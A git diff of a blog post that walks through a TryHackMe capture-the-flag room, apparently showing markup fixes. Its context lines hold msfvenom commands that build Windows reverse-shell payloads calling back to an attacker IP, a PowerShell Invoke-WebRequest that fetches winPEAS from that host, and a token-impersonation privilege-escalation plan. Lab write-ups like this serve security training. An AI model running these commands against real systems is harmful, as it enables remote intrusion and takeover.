@@ -334,7 +334,8 @@ I actually started 3 different scans, each using a different tool and wordlist (
 </span></span></code></pre></div><p>After several <code>ERROR</code> logs we get one directory: <code>/nt4wrksv (Status: 301)</code> with the same name as one of the SMB shares we found before. Let&rsquo;s see if we can do anything there. Since the name is exactly the same as the SMB share, we can speculate that this URL is communicating to that share.</p>
 <p>If we recall from our previous SMB enumeration and the files we found there, we know there is a <code>passwords.txt</code> file on that share. Let&rsquo;s see if we can reach that file via browser:</p>
 <blockquote>
-<p>(Not sure if I&rsquo;m doing something wrong, or if any of my scans are causing the remote machine deployed on THM to die on me every now and then. First time happening honestly, I doubt there is something wrong with the room. But I have to keep killing and redeploying the machine quite often once it becomes totally unresponsive randomly.)</p></blockquote>
+<p>(Not sure if I&rsquo;m doing something wrong, or if any of my scans are causing the remote machine deployed on THM to die on me every now and then. First time happening honestly, I doubt there is something wrong with the room. But I have to keep killing and redeploying the machine quite often once it becomes totally unresponsive randomly.)</p>
+</blockquote>
 <p><img src="https://i.imgur.com/y6rcQb0.png" alt="We can get passwords.txt on that URL"></p>
 <p>So far our enum results are these:</p>
 <ul>
@@ -385,7 +386,8 @@ I actually started 3 different scans, each using a different tool and wordlist (
 <p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.0.34 LPORT=4444 -f aspx &gt; tzshell.aspx </code></p>
 <p>I went ahead and uploaded it to the share. Let&rsquo;s see if this works now.</p>
 <blockquote>
-<p>Remember to ready the listener if you closed it before.</p></blockquote>
+<p>Remember to ready the listener if you closed it before.</p>
+</blockquote>
 <p>It did not work either. This time the page did not throw any error, just loaded a blank page. However, we did not get any reverse shell.
 Time to think about this a bit more, what I&rsquo;m doing wrong?</p>
 <ul>
@@ -398,7 +400,8 @@ Time to think about this a bit more, what I&rsquo;m doing wrong?</p>
 Googling around I found a clue, and I had to do with how I generated the payload.</p>
 <blockquote>
 <p>Check the related post on ASP payload generation I mentioned <a href="https://isc.sans.edu/forums/diary/Analyzing+Metasploit+ASP+NET+Payloads/26392/">here</a>
-Though it talks about meterpreter payload, I&rsquo;m sticking to a plain shell for now.</p></blockquote>
+Though it talks about meterpreter payload, I&rsquo;m sticking to a plain shell for now.</p>
+</blockquote>
 <p>Let&rsquo;s see what generated before: <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.0.34 LPORT=4444 -f asp &gt; tzshell.asp</code></p>
 <p>You see the problem? I generated a <code>windows/shell_reverse_tcp</code>, I assumed that was the correct setting. But turns out that we also can do this for x64:</p>
 <p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.0.34 LPORT=4444 -f aspx &gt; tzshell3.aspx</code></p>
@@ -433,7 +436,8 @@ I&rsquo;ll be using <code>winPEAS.bat</code> version (there is a .exe version as
 I changed to another VPN server location on THM and reconnected. The VM is still not responding, not even ping. I&rsquo;ll just terminate and redeploy again I guess.</p>
 <p>I went ahead and performed all the steps that we saw until I get the reverse shell again. Let&rsquo;s upload winPEAS and run it. Here another nice thing of this room, neither curl nor wget worked. But we do have Powershell.</p>
 <blockquote>
-<p>Check <a href="https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/">this page</a> for a bit more on downloading files with Powershell.</p></blockquote>
+<p>Check <a href="https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/">this page</a> for a bit more on downloading files with Powershell.</p>
+</blockquote>
 <p><code>Invoke-WebRequest -Uri &quot;http://10.13.0.34:2112/winPEAS.bat&quot; -OutFile &quot;winPEAS.bat&quot;</code></p>
 <p>And this time we succeed. Nothing like the nth time charm :laughing:</p>
 <p><img src="https://i.imgur.com/KjQdKLR.png" alt="We get winPEAS uploaded"></p>
@@ -501,7 +505,8 @@ Searching around I find this link on the awesome <code>hacktricks</code> book, c
 <li>Trick the “NT AUTHORITY\SYSTEM” account into authenticating via NTLM to a TCP endpoint we control.</li>
 <li>Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account. This is done through a series of Windows API calls.</li>
 <li>Impersonate the token we have just negotiated. This can only be done if the attacker&rsquo;s current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.</li>
-</ol></blockquote>
+</ol>
+</blockquote>
 <p>I&rsquo;m not sure if we should proceed with that, it could very well be another decoy. Let me research around a bit more to see if there is any other way to exploit the same.</p>
 <p>There is a tool for this, called <strong>RogueWinRM</strong> located <a href="https://github.com/antonioCoco/RogueWinRM">here</a> that looks interesting and pretty straightforward.
 Let&rsquo;s reopen our rev shell session, upload the exploit, and try to execute it.</p>
